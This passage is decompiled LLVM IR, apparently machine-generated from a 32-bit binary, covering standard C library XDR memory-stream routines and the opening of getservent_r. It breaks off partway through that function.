dec_label_pc_8064c7d:                             ; preds = %dec_label_pc_8064c0d, %dec_label_pc_8064bff, %entry
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064c86

dec_label_pc_8064c81:                             ; preds = %dec_label_pc_8064c5f, %dec_label_pc_8064c14
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064c86

dec_label_pc_8064c86:                             ; preds = %dec_label_pc_8064c7d, %dec_label_pc_8064c78, %dec_label_pc_8064c81
  %v0_8064c8d = phi i32 [ 0, %dec_label_pc_8064c7d ], [ %v0_8064c8d.pre, %dec_label_pc_8064c78 ], [ 1, %dec_label_pc_8064c81 ]
  store i32 %v0_8064bc9, i32* %esi.global-to-local, align 4
  store i32 %v0_8064bc8, i32* @edi, align 4
  store i32 %v0_8064bc7, i32* @ebp, align 4
  ret i32 %v0_8064c8d

; uselistorder directives
  uselistorder i32 %v2_8064c20, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8064c04.pre, { 0, 3, 1, 4, 2 }
  uselistorder i32 %v0_8064c04.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8064bf7, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8064bc9, { 1, 0 }
  uselistorder i32 %v0_8064bc8, { 1, 0 }
  uselistorder i32 %v0_8064bc7, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @xdr_opaque, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064c86, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064c78, { 1, 0 }
  uselistorder label %dec_label_pc_8064c5f, { 1, 0 }
  uselistorder label %dec_label_pc_8064c04, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8064c9b = add i32 %arg2, 4
  %v4_8064ca3 = inttoptr i32 %arg1 to i32*
  %v5_8064ca3 = call i32 @xdr_bytes(i32* %v4_8064ca3, i32 %v1_8064c9b, i32 %arg2, i32 1024)
  ret i32 %v5_8064ca3
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %arg1, align 4
  %v1_8064cba = add i32 %tmp3, 4
  %v2_8064cba = inttoptr i32 %v1_8064cba to i32*
  store i32 ptrtoint (i32* @global_var_806f060.760 to i32), i32* %v2_8064cba, align 4
  %v0_8064cc1 = load i32, i32* @ecx, align 4
  %v1_8064cc1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8064cc1 = add i32 %v1_8064cc1, 16
  %v3_8064cc1 = inttoptr i32 %v2_8064cc1 to i32*
  store i32 %v0_8064cc1, i32* %v3_8064cc1, align 4
  %v0_8064cc4 = load i32, i32* @ecx, align 4
  %v1_8064cc4 = load i32, i32* %edx.global-to-local, align 4
  %v2_8064cc4 = add i32 %v1_8064cc4, 12
  %v3_8064cc4 = inttoptr i32 %v2_8064cc4 to i32*
  store i32 %v0_8064cc4, i32* %v3_8064cc4, align 4
  %v1_8064ccb = load i32, i32* %edx.global-to-local, align 4
  %v2_8064ccb = add i32 %v1_8064ccb, 20
  %v3_8064ccb = inttoptr i32 %v2_8064ccb to i32*
  store i32 %arg3, i32* %v3_8064ccb, align 4
  ret i32 %arg3

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_8064ccf = load i32, i32* @eax, align 4
  ret i32 %v0_8064ccf
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8064cd4 = add i32 %arg1, 12
  %v2_8064cd4 = inttoptr i32 %v1_8064cd4 to i32*
  %v3_8064cd4 = load i32, i32* %v2_8064cd4, align 4
  %v2_8064cd7 = add i32 %arg1, 16
  %v3_8064cd7 = inttoptr i32 %v2_8064cd7 to i32*
  %v4_8064cd7 = load i32, i32* %v3_8064cd7, align 4
  %v5_8064cd7 = sub i32 %v3_8064cd4, %v4_8064cd7
  ret i32 %v5_8064cd7
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8064cdb = load i32, i32* @ebx, align 4
  store i32 %v0_8064cdb, i32* %stack_var_-4, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8064ce6 = add i32 %arg1, 20
  %v2_8064ce6 = inttoptr i32 %v1_8064ce6 to i32*
  %v3_8064ce6 = load i32, i32* %v2_8064ce6, align 4
  store i32 %v3_8064ce6, i32* %eax.global-to-local, align 4
  %v2_8064ce9 = add i32 %arg1, 16
  %v3_8064ce9 = inttoptr i32 %v2_8064ce9 to i32*
  %v4_8064ce9 = load i32, i32* %v3_8064ce9, align 4
  %v5_8064ce9 = add i32 %v4_8064ce9, %arg2
  %v2_8064cec = add i32 %arg1, 12
  %v3_8064cec = inttoptr i32 %v2_8064cec to i32*
  %v4_8064cec = load i32, i32* %v3_8064cec, align 4
  %v5_8064cec = add i32 %v4_8064cec, %v3_8064ce6
  store i32 %v5_8064cec, i32* %eax.global-to-local, align 4
  %v8_8064cf1 = icmp slt i32 %v5_8064cec, %v5_8064ce9
  br i1 %v8_8064cf1, label %dec_label_pc_8064cfd, label %dec_label_pc_8064cf3

dec_label_pc_8064cf3:                             ; preds = %entry
  %v2_8064cf3 = sub i32 %v5_8064cec, %v5_8064ce9
  store i32 %v2_8064cf3, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  store i32 %v5_8064ce9, i32* %v3_8064cec, align 4
  %v0_8064cfa = load i32, i32* %eax.global-to-local, align 4
  %v1_8064cfa = load i32, i32* %ecx.global-to-local, align 4
  %v2_8064cfa = add i32 %v1_8064cfa, 20
  %v3_8064cfa = inttoptr i32 %v2_8064cfa to i32*
  store i32 %v0_8064cfa, i32* %v3_8064cfa, align 4
  %v0_8064cfd.pre = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8064cfd

dec_label_pc_8064cfd:                             ; preds = %entry, %dec_label_pc_8064cf3
  %v2_8064cff = phi i32 [ %v0_8064cdb, %entry ], [ %v2_8064cff.pre, %dec_label_pc_8064cf3 ]
  %v0_8064cfd = phi i32 [ 0, %entry ], [ %v0_8064cfd.pre, %dec_label_pc_8064cf3 ]
  store i32 %v0_8064cfd, i32* %eax.global-to-local, align 4
  store i32 %v2_8064cff, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8064cfd

; uselistorder directives
  uselistorder i32 %v0_8064cfd, { 1, 0 }
  uselistorder i32 %v5_8064cec, { 1, 0, 2 }
  uselistorder i32 %v5_8064ce9, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8064cfd, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8064d01 = load i32, i32* @ebx, align 4
  store i32 %v0_8064d01, i32* %stack_var_-4, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_8064d0c = add i32 %arg1, 20
  %v2_8064d0c = inttoptr i32 %v1_8064d0c to i32*
  %v3_8064d0c = load i32, i32* %v2_8064d0c, align 4
  %v7_8064d0f = icmp ult i32 %v3_8064d0c, %arg2
  br i1 %v7_8064d0f, label %dec_label_pc_8064d21, label %dec_label_pc_8064d13

dec_label_pc_8064d13:                             ; preds = %entry
  %v2_8064d0f = sub i32 %v3_8064d0c, %arg2
  %v1_8064d13 = add i32 %arg1, 12
  %v2_8064d13 = inttoptr i32 %v1_8064d13 to i32*
  %v3_8064d13 = load i32, i32* %v2_8064d13, align 4
  store i32 %v3_8064d13, i32* %edx.global-to-local, align 4
  store i32 %v2_8064d0f, i32* %v2_8064d0c, align 4
  %v0_8064d1b = load i32, i32* %edx.global-to-local, align 4
  %v1_8064d1b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064d1b = add i32 %v1_8064d1b, %v0_8064d1b
  %v1_8064d1e = load i32, i32* %ecx.global-to-local, align 4
  %v2_8064d1e = add i32 %v1_8064d1e, 12
  %v3_8064d1e = inttoptr i32 %v2_8064d1e to i32*
  store i32 %v2_8064d1b, i32* %v3_8064d1e, align 4
  %v2_8064d21.pre = load i32, i32* %stack_var_-4, align 4
  %v0_8064d22.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064d21

dec_label_pc_8064d21:                             ; preds = %entry, %dec_label_pc_8064d13
  %v0_8064d22 = phi i32 [ 0, %entry ], [ %v0_8064d22.pre, %dec_label_pc_8064d13 ]
  %v2_8064d21 = phi i32 [ %v0_8064d01, %entry ], [ %v2_8064d21.pre, %dec_label_pc_8064d13 ]
  store i32 %v2_8064d21, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8064d22

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8064d21, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8064d2b = add i32 %arg1, 20
  %v2_8064d2b = inttoptr i32 %v1_8064d2b to i32*
  %v3_8064d2b = load i32, i32* %v2_8064d2b, align 4
  %tmp = icmp ult i32 %v3_8064d2b, 4
  br i1 %tmp, label %dec_label_pc_8064d4f, label %dec_label_pc_8064d33

dec_label_pc_8064d33:                             ; preds = %entry
  %v1_8064d33 = add i32 %v3_8064d2b, -4
  %v1_8064d36 = add i32 %arg1, 12
  %v2_8064d36 = inttoptr i32 %v1_8064d36 to i32*
  %v3_8064d36 = load i32, i32* %v2_8064d36, align 4
  store i32 %v3_8064d36, i32* %edx.global-to-local, align 4
  store i32 %v1_8064d33, i32* %v2_8064d2b, align 4
  %v2_8064d40 = load i32, i32* %arg2, align 4
  %v1_8064d42 = call i32 @llvm.bswap.i32(i32 %v2_8064d40)
  %v1_8064d44 = load i32, i32* %edx.global-to-local, align 4
  %v2_8064d44 = inttoptr i32 %v1_8064d44 to i32*
  store i32 %v1_8064d42, i32* %v2_8064d44, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8064d4b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064d4b = add i32 %v0_8064d4b, 12
  %v2_8064d4b = inttoptr i32 %v1_8064d4b to i32*
  %v3_8064d4b = load i32, i32* %v2_8064d4b, align 4
  %v4_8064d4b = add i32 %v3_8064d4b, 4
  store i32 %v4_8064d4b, i32* %v2_8064d4b, align 4
  %v0_8064d4f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064d4f

dec_label_pc_8064d4f:                             ; preds = %entry, %dec_label_pc_8064d33
  %v0_8064d4f = phi i32 [ 0, %entry ], [ %v0_8064d4f.pre, %dec_label_pc_8064d33 ]
  ret i32 %v0_8064d4f

; uselistorder directives
  uselistorder i32 %v3_8064d2b, { 1, 0 }
  uselistorder label %dec_label_pc_8064d4f, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8064d58 = add i32 %arg1, 20
  %v2_8064d58 = inttoptr i32 %v1_8064d58 to i32*
  %v3_8064d58 = load i32, i32* %v2_8064d58, align 4
  %tmp = icmp ult i32 %v3_8064d58, 4
  br i1 %tmp, label %dec_label_pc_8064d7c, label %dec_label_pc_8064d60

dec_label_pc_8064d60:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_8064d60 = add i32 %v3_8064d58, -4
  store i32 %v1_8064d60, i32* %v2_8064d58, align 4
  %v0_8064d66 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064d66 = add i32 %v0_8064d66, 12
  %v2_8064d66 = inttoptr i32 %v1_8064d66 to i32*
  %v3_8064d66 = load i32, i32* %v2_8064d66, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_8064d6d = inttoptr i32 %v3_8064d66 to i32*
  %v2_8064d6d = load i32, i32* %v1_8064d6d, align 4
  %v1_8064d6f = call i32 @llvm.bswap.i32(i32 %v2_8064d6d)
  store i32 %v1_8064d6f, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8064d78 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064d78 = add i32 %v0_8064d78, 12
  %v2_8064d78 = inttoptr i32 %v1_8064d78 to i32*
  %v3_8064d78 = load i32, i32* %v2_8064d78, align 4
  %v4_8064d78 = add i32 %v3_8064d78, 4
  store i32 %v4_8064d78, i32* %v2_8064d78, align 4
  %v0_8064d7c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064d7c

dec_label_pc_8064d7c:                             ; preds = %entry, %dec_label_pc_8064d60
  %v0_8064d7c = phi i32 [ 0, %entry ], [ %v0_8064d7c.pre, %dec_label_pc_8064d60 ]
  ret i32 %v0_8064d7c

; uselistorder directives
  uselistorder i32 %v3_8064d58, { 1, 0 }
  uselistorder label %dec_label_pc_8064d7c, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8064d85 = add i32 %arg1, 20
  %v2_8064d85 = inttoptr i32 %v1_8064d85 to i32*
  %v3_8064d85 = load i32, i32* %v2_8064d85, align 4
  %tmp = icmp ult i32 %v3_8064d85, 4
  br i1 %tmp, label %dec_label_pc_8064da9, label %dec_label_pc_8064d8d

dec_label_pc_8064d8d:                             ; preds = %entry
  %v1_8064d8d = add i32 %v3_8064d85, -4
  %v1_8064d90 = add i32 %arg1, 12
  %v2_8064d90 = inttoptr i32 %v1_8064d90 to i32*
  %v3_8064d90 = load i32, i32* %v2_8064d90, align 4
  store i32 %v3_8064d90, i32* %edx.global-to-local, align 4
  store i32 %v1_8064d8d, i32* %v2_8064d85, align 4
  %v2_8064d9a = load i32, i32* %arg2, align 4
  %v1_8064d9c = call i32 @llvm.bswap.i32(i32 %v2_8064d9a)
  %v1_8064d9e = load i32, i32* %edx.global-to-local, align 4
  %v2_8064d9e = inttoptr i32 %v1_8064d9e to i32*
  store i32 %v1_8064d9c, i32* %v2_8064d9e, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8064da5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064da5 = add i32 %v0_8064da5, 12
  %v2_8064da5 = inttoptr i32 %v1_8064da5 to i32*
  %v3_8064da5 = load i32, i32* %v2_8064da5, align 4
  %v4_8064da5 = add i32 %v3_8064da5, 4
  store i32 %v4_8064da5, i32* %v2_8064da5, align 4
  %v0_8064da9.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064da9

dec_label_pc_8064da9:                             ; preds = %entry, %dec_label_pc_8064d8d
  %v0_8064da9 = phi i32 [ 0, %entry ], [ %v0_8064da9.pre, %dec_label_pc_8064d8d ]
  ret i32 %v0_8064da9

; uselistorder directives
  uselistorder i32 %v3_8064d85, { 1, 0 }
  uselistorder label %dec_label_pc_8064da9, { 1, 0 }
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8064db2 = add i32 %arg1, 20
  %v2_8064db2 = inttoptr i32 %v1_8064db2 to i32*
  %v3_8064db2 = load i32, i32* %v2_8064db2, align 4
  %tmp = icmp ult i32 %v3_8064db2, 4
  br i1 %tmp, label %dec_label_pc_8064dd6, label %dec_label_pc_8064dba

dec_label_pc_8064dba:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_8064dba = add i32 %v3_8064db2, -4
  store i32 %v1_8064dba, i32* %v2_8064db2, align 4
  %v0_8064dc0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064dc0 = add i32 %v0_8064dc0, 12
  %v2_8064dc0 = inttoptr i32 %v1_8064dc0 to i32*
  %v3_8064dc0 = load i32, i32* %v2_8064dc0, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_8064dc7 = inttoptr i32 %v3_8064dc0 to i32*
  %v2_8064dc7 = load i32, i32* %v1_8064dc7, align 4
  %v1_8064dc9 = call i32 @llvm.bswap.i32(i32 %v2_8064dc7)
  store i32 %v1_8064dc9, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8064dd2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064dd2 = add i32 %v0_8064dd2, 12
  %v2_8064dd2 = inttoptr i32 %v1_8064dd2 to i32*
  %v3_8064dd2 = load i32, i32* %v2_8064dd2, align 4
  %v4_8064dd2 = add i32 %v3_8064dd2, 4
  store i32 %v4_8064dd2, i32* %v2_8064dd2, align 4
  %v0_8064dd6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064dd6

dec_label_pc_8064dd6:                             ; preds = %entry, %dec_label_pc_8064dba
  %v0_8064dd6 = phi i32 [ 0, %entry ], [ %v0_8064dd6.pre, %dec_label_pc_8064dba ]
  ret i32 %v0_8064dd6

; uselistorder directives
  uselistorder i32 %v3_8064db2, { 1, 0 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 5, 16, 18, 19, 17 }
  uselistorder label %dec_label_pc_8064dd6, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8064de8 = add i32 %arg1, 20
  %v2_8064de8 = inttoptr i32 %v1_8064de8 to i32*
  %v3_8064de8 = load i32, i32* %v2_8064de8, align 4
  %v7_8064deb = icmp ult i32 %v3_8064de8, %arg3
  br i1 %v7_8064deb, label %dec_label_pc_8064e0d, label %dec_label_pc_8064def

dec_label_pc_8064def:                             ; preds = %entry
  %v2_8064deb = sub i32 %v3_8064de8, %arg3
  store i32 %v2_8064deb, i32* %v2_8064de8, align 4
  %v0_8064df5 = load i32, i32* @esi, align 4
  %v0_8064dfa = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064dfa = add i32 %v0_8064dfa, 12
  %v2_8064dfa = inttoptr i32 %v1_8064dfa to i32*
  %v3_8064dfa = load i32, i32* %v2_8064dfa, align 4
  %v3_8064dfd = inttoptr i32 %v3_8064dfa to i16*
  %v4_8064dfd = call i32 @memcpy(i16* %v3_8064dfd, i32 %arg2, i32 %v0_8064df5)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8064e0a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064e0a = add i32 %v0_8064e0a, 12
  %v2_8064e0a = inttoptr i32 %v1_8064e0a to i32*
  %v3_8064e0a = load i32, i32* %v2_8064e0a, align 4
  %v4_8064e0a = load i32, i32* @esi, align 4
  %v5_8064e0a = add i32 %v4_8064e0a, %v3_8064e0a
  store i32 %v5_8064e0a, i32* %v2_8064e0a, align 4
  %v0_8064e10.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064e0d

dec_label_pc_8064e0d:                             ; preds = %entry, %dec_label_pc_8064def
  %v0_8064e10 = phi i32 [ 0, %entry ], [ %v0_8064e10.pre, %dec_label_pc_8064def ]
  ret i32 %v0_8064e10

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064e0d, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8064e20 = add i32 %arg1, 20
  %v2_8064e20 = inttoptr i32 %v1_8064e20 to i32*
  %v3_8064e20 = load i32, i32* %v2_8064e20, align 4
  %v7_8064e23 = icmp ult i32 %v3_8064e20, %arg3
  br i1 %v7_8064e23, label %dec_label_pc_8064e45, label %dec_label_pc_8064e27

dec_label_pc_8064e27:                             ; preds = %entry
  %v2_8064e23 = sub i32 %v3_8064e20, %arg3
  store i32 %v2_8064e23, i32* %v2_8064e20, align 4
  %v0_8064e2d = load i32, i32* @esi, align 4
  %v0_8064e2e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064e2e = add i32 %v0_8064e2e, 12
  %v2_8064e2e = inttoptr i32 %v1_8064e2e to i32*
  %v3_8064e2e = load i32, i32* %v2_8064e2e, align 4
  %v3_8064e35 = inttoptr i32 %arg2 to i16*
  %v4_8064e35 = call i32 @memcpy(i16* %v3_8064e35, i32 %v3_8064e2e, i32 %v0_8064e2d)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8064e42 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064e42 = add i32 %v0_8064e42, 12
  %v2_8064e42 = inttoptr i32 %v1_8064e42 to i32*
  %v3_8064e42 = load i32, i32* %v2_8064e42, align 4
  %v4_8064e42 = load i32, i32* @esi, align 4
  %v5_8064e42 = add i32 %v4_8064e42, %v3_8064e42
  store i32 %v5_8064e42, i32* %v2_8064e42, align 4
  %v0_8064e48.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064e45

dec_label_pc_8064e45:                             ; preds = %entry, %dec_label_pc_8064e27
  %v0_8064e48 = phi i32 [ 0, %entry ], [ %v0_8064e48.pre, %dec_label_pc_8064e27 ]
  ret i32 %v0_8064e48

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064e45, { 1, 0 }
}

define i32 @__initbuf() local_unnamed_addr {
entry:
  %v0_8064e4f = load i32, i32* @global_var_807e040.761, align 64
  %v1_8064e4f = icmp eq i32 %v0_8064e4f, 0
  %v1_8064e56 = icmp eq i1 %v1_8064e4f, false
  br i1 %v1_8064e56, label %entry.dec_label_pc_8064e76_crit_edge, label %dec_label_pc_8064e58

entry.dec_label_pc_8064e76_crit_edge:             ; preds = %entry
  %v0_8064e79.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8064e76

dec_label_pc_8064e58:                             ; preds = %entry
  %v1_8064e60 = call i32 @malloc(i32 4237)
  %v1_8064e68 = icmp eq i32 %v1_8064e60, 0
  store i32 %v1_8064e60, i32* @global_var_807e040.761, align 64
  %v1_8064e6f = icmp eq i1 %v1_8064e68, false
  br i1 %v1_8064e6f, label %dec_label_pc_8064e76, label %dec_label_pc_8064e71

dec_label_pc_8064e71:                             ; preds = %dec_label_pc_8064e58
  %v0_8064e71 = call i32 @abort()
  br label %dec_label_pc_8064e76

dec_label_pc_8064e76:                             ; preds = %entry.dec_label_pc_8064e76_crit_edge, %dec_label_pc_8064e58, %dec_label_pc_8064e71
  %v0_8064e79 = phi i32 [ %v1_8064e60, %dec_label_pc_8064e58 ], [ %v0_8064e79.pre, %entry.dec_label_pc_8064e76_crit_edge ], [ %v0_8064e71, %dec_label_pc_8064e71 ]
  ret i32 %v0_8064e79

; uselistorder directives
  uselistorder label %dec_label_pc_8064e76, { 2, 1, 0 }
}

define i32 @getservent_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg1 to i32
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8064e7a = load i32, i32* @ebp, align 4
  %v0_8064e7b = load i32, i32* @edi, align 4
  %v0_8064e7c = load i32, i32* @esi, align 4
  %v0_8064e7d = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  store i32 %tmp15, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_8064e97 = inttoptr i32 %arg4 to i32*
  store i32 0, i32* %v1_8064e97, align 4
  %v6_8064e9d = icmp ugt i32 %arg3, 139
  br i1 %v6_8064e9d, label %dec_label_pc_8064eb4, label %dec_label_pc_8064e9f

dec_label_pc_8064e9f:                             ; preds = %entry
  %v1_8064e9f = call i32 @__errno_location(i32 %v0_8064e7d)
  store i32 %v1_8064e9f, i32* %eax.global-to-local, align 4
  store i32 34, i32* @ebx, align 4
  %v1_8064ea9 = inttoptr i32 %v1_8064e9f to i32*
  store i32 34, i32* %v1_8064ea9, align 4
  br label %dec_label_pc_8065043

dec_label_pc_8064eb4:                             ; preds = %entry
  %v2_8064ebf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8064ebf, i32* %eax.global-to-local, align 4
  store i32 %v2_8064ebf, i32* %stack_var_-60, align 4
  %v4_8064ec4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  store i32 %v4_8064ec4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8075664.762 to i32), i32* %stack_var_-60, align 4
  %v1_8064ed0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v0_8064ed5 = load i32, i32* @ebp, align 4
  %v1_8064ed5 = add i32 %v0_8064ed5, 140
  %v0_8064edf = load i32, i32* @ebx, align 4
  %v1_8064edf = add i32 %v0_8064edf, -140
  store i32 %v1_8064edf, i32* @eax, align 4
  %v6_8064eed = icmp ugt i32 %v1_8064edf, 4096
  br i1 %v6_8064eed, label %dec_label_pc_8064f04, label %dec_label_pc_8064eef

dec_label_pc_8064eef:                             ; preds = %dec_label_pc_8064eb4
  %v1_8064eef = call i32 @__errno_location(i32 %v1_8064ed5)
  store i32 %v1_8064eef, i32* %eax.global-to-local, align 4
  store i32 34, i32* @ebx, align 4
  %v1_8064ef9 = inttoptr i32 %v1_8064eef to i32*
  store i32 34, i32* %v1_8064ef9, align 4
  br label %dec_label_pc_8065032

dec_label_pc_8064f04:                             ; preds = %dec_label_pc_8064eb4
  %v0_8064f04 = load i32, i32* @global_var_807e044.763, align 4
  %v1_8064f04 = icmp eq i32 %v0_8064f04, 0
  %v1_8064f0b = icmp eq i1 %v1_8064f04, false
  br i1 %v1_8064f0b, label %dec_label_pc_8064f3f.preheader, label %dec_label_pc_8064f0d

dec_label_pc_8064f0d:                             ; preds = %dec_label_pc_8064f04
  store i32 ptrtoint ([14 x i8]* @global_var_806f088.765 to i32), i32* %stack_var_-60, align 4
  %v2_8064f19 = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_806f088.765 to i32), i32 ptrtoint (i32* @global_var_806f0d1.764 to i32))
  store i32 %v2_8064f19, i32* %eax.global-to-local, align 4
  %v1_8064f21 = icmp eq i32 %v2_8064f19, 0
  store i32 %v2_8064f19, i32* @global_var_807e044.763, align 4
  %v1_8064f28 = icmp eq i1 %v1_8064f21, false
  br i1 %v1_8064f28, label %dec_label_pc_8064f3f.preheader, label %dec_label_pc_8064f2a

dec_label_pc_8064f3f.preheader:                   ; preds = %dec_label_pc_8064f04, %dec_label_pc_8064f0d
  %v0_8064f40.ph = phi i32 [ %v2_8064f19, %dec_label_pc_8064f0d ], [ %v0_8064f04, %dec_label_pc_8064f04 ]
  store i32 %v1_8064ed5, i32* %stack_var_-60, align 4
  %v3_8064f4f38 = call i32 @fgets(i32 %v1_8064ed5, i32 4096, i32 %v0_8064f40.ph)
  store i32 %v3_8064f4f38, i32* %eax.global-to-local, align 4
  %v1_8064f5739 = icmp eq i32 %v3_8064f4f38, 0
  store i32 %v3_8064f4f38, i32* @ebx, align 4
  br i1 %v1_8064f5739, label %dec_label_pc_8064f2a, label %dec_label_pc_8064f5d

dec_label_pc_8064f2a:                             ; preds = %dec_label_pc_8064f3f.preheader, %dec_label_pc_8064f3f.backedge, %dec_label_pc_8064f0d
